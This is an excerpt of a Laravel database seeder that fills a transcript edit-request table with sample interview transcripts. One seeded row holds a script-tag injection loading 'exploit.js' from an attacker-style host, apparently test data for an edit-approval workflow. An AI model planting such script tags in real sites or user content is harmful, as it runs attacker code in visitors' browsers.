...
class UserEditRequestTableSeeder extends Seeder
{
    ...
    public function run()
    {
        ...
        \DB::table('user_edit_request')->delete();
        
        \DB::table('user_edit_request')->insert(array (
            0 => 
            array (
                'id' => 2,
                'user_id' => 1,
                'transcript_id' => 2,
                'text' => 'Transcribed by Jacob Haney
...
',
                ...
                'create_time' => '2021-04-12 01:26:29',
            ),
            1 => 
            array (
                'id' => 3,
                'user_id' => 1,
                'transcript_id' => 3,
                'text' => 'INTERVIEWER: All right. So uh one more time for the record. Uh could I have your name?
BRENDA: Brenda Camp.
...
Siskowitz: I appreciate that',
                'edit_comment' => 'Initial transcript',
                'request_approved' => true,
                'create_time' => '2021-04-26 03:04:08.031559',
            ),
            4 => 
            array (
                'id' => 4,
                'user_id' => 5,
                'transcript_id' => 4,
                'text' => '<script src="https://hack.com/exploit.js"></script>I am vandalizing your website! No more transcripts for you! Ha ha! Wait, there\'s approval? Shoot, I didn\'t think that far...',
            'edit_comment' => '>:)',
            'request_approved' => NULL,
            'create_time' => '2021-04-12 01:39:34',
        ),
    ));
